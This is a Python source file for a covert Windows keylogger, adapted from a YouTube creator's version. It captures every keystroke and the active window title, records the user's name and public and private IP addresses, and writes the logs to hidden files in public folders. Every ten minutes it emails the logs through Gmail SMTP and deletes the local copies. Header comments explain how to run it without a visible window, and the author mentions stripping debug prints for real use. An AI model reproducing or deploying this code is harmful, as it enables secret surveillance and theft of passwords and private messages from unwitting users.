#### install via cable
#pip install pynput
#pip install pywin32
#pip install requests
#pip install easygui
#run powershell >  pythonw "C:\Path\Path\python keylogger test.py"
##pythonw = pythonwithoutwindow
# powershell -WindowStyle Hidden
###Hides powershellwindow
# //python keylogging program

## You will need to comment out the prints and exception prints on code if you were to use this for real, as its testing
## i have prints on here that will tell you and let you know what part of the program is going at the time and that it is
## working

# Youtube channel of original creator - https://bit.ly/2U58Lt9
#modified by me

# imports
from easygui import passwordbox
from pynput.keyboard import Key, Listener
import win32gui
import easygui
import os
import time
import requests
import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

datetime = time.ctime( time.time() )
user = os.path.expanduser( '~' ).split( '\\' )[2]
publicIP = requests.get( 'https://api.ipify.org/' ).text
privateIP = socket.gethostbyname( socket.gethostname() )

msg = f'[START OF LOGS]\n  *~ Keylogger run Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append( msg )

old_app = ''
delete_file = []

mssg = "Enter logon information"
titleEmail = "Email"
fieldEmail = []
fieldValuesEmail = []  # we start with blanks for the values
fieldValuesEmail = passwordbox( mssg, titleEmail, fieldEmail )

# make sure that none of the fields was left blank
while 1:
    if fieldValuesEmail == None: break
    errmsg = ""
    for i in range( len( fieldEmail ) ):
        if fieldValuesEmail[i].strip() == "":
            errmsg = errmsg + ('"%s" is a required field.\n\n' % fieldEmail[i])
    if errmsg == "": break  # no problems found
    fieldValues = passwordbox( errmsg, titleEmail, fieldEmail, fieldValuesEmail )
print( "Reply was:", fieldValuesEmail )

titlePw = "Pw"
fieldPw = []
fieldValuesPw = []  # we start with blanks for the values
fieldValuesPw = passwordbox( mssg, titlePw, fieldPw )

# make sure that none of the fields was left blank
while 1:
    if fieldValuesPw == None: break
    errmsg = ""
    for i in range( len( fieldPw ) ):
        if fieldValuesPw[i].strip() == "":
            errmsg = errmsg + ('"%s" is a required field.\n\n' % fieldPw[i])
    if errmsg == "": break  # no problems found
    fieldValuesPw = passwordbox( errmsg, titleEmail, fieldPw, fieldValues )
print( "Reply was:", fieldValuesPw )

def on_press(key):
    global old_app

    new_app = win32gui.GetWindowText( win32gui.GetForegroundWindow() )

    if new_app == 'Cortana':
        new_app = 'Windows Start Menu'
    else:
        pass

    if new_app != old_app and new_app != '':
        logged_data.append( f'[{datetime}] ~ {new_app}\n' )
        old_app = new_app
    else:
        pass

    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                    'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                    'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
                    '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd',
                    '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

    key = str( key ).strip( '\'' )
    if key in substitution:
        logged_data.append( substitution[substitution.index( key ) + 1] )
    else:
         logged_data.append( key )


def write_file(count):
    #one = os.path.expanduser( '~' ) + '/Downloads/'
    #one = 'C:/Users/Public/Downloads/'
    #two = 'C:/Users/Public/Pictures/'
    #two = os.path.expanduser( '~' ) + '/Pictures/'
    #C:\Users\Public\Downloads
    #one = os.path.dirname('C:/Users/Public/Pictures/ ')
    #two = os.path.dirname('C:/Users/Public/Downloads/ ')
    one = os.path.expanduser( 'C:/Users/Public' ) + '/Downloads/'
    two = os.path.expanduser( 'C:/Users/Public' ) + '/Pictures/'

    list = [one, two]

    filepath = random.choice( list )
    print("File path chose:", filepath)
    format = 'txt'
    filename = str( count ) + 'I' + str( random.randint( 1000000, 9999999 ) ) + "." + format
    file = filepath + filename
    print("File Name/Path: ", file)
    delete_file.append( file )

    with open( file, 'w' ) as fp:
        fp.write( ''.join( logged_data ) )
    print( 'written all good' )


def timer():
    MIN = 10
    SECONDS = 60
    time.sleep(MIN * SECONDS) # every 10 mins write file/send log
    # time.sleep( 30 )  # for debugging ~ yes program works :)
    pass


def send_logs():
    count = 0

    fromAddr = fieldValuesEmail

    fromPswd = fieldValuesPw

    toAddr = fieldValuesEmail

    while True:
        if len( logged_data ) > 1:
            try:
                write_file( count )

                subject = f'[{user}] ~ {count}'

                msg = MIMEMultipart()
                msg['From'] = fromAddr
                msg['To'] = toAddr
                msg['Subject'] = subject
                body = time.ctime(time.time())
                msg.attach( MIMEText( body, 'plain' ) )

                attachment = open( delete_file[0], 'rb' )
                print( "attachment name:", attachment )

                filename = delete_file[0].split( '/' )[4] #splits pathways(/) 4 is how far in file in OS ex: OS:Folder/Folder/Folder/FILEISHERE
                print("filename after attachment:", filename)

                part = MIMEBase( 'application', 'octect-stream' )
                part.set_payload( (attachment).read() )
                encoders.encode_base64( part )
                part.add_header( 'content-disposition', 'attachment;filename=' + str( filename ) )
                msg.attach( part )

                text = msg.as_string()
                print( 'test msgasstring:', msg.as_string )

                s = smtplib.SMTP( 'smtp.gmail.com', 587 )
                s.ehlo()
                s.starttls()
                print( 'starttls' )
                s.ehlo()
                s.login( fromAddr, fromPswd )
                s.sendmail( fromAddr, toAddr, text )
                print( 'sent mail' )
                attachment.close()
                s.close()

                os.remove( delete_file[0] )
                del logged_data[1:]
                del delete_file[0:]
                print( 'delete data/files' )
                timer()
                count += 1

            except Exception as errorString:
                print( '[!] send_logs // Error.. ~ %s' % (errorString) )
                pass

if __name__ == '__main__':
    T1 = threading.Thread( target=send_logs )
    T1.start()

    with Listener( on_press=on_press ) as listener:
        listener.join()
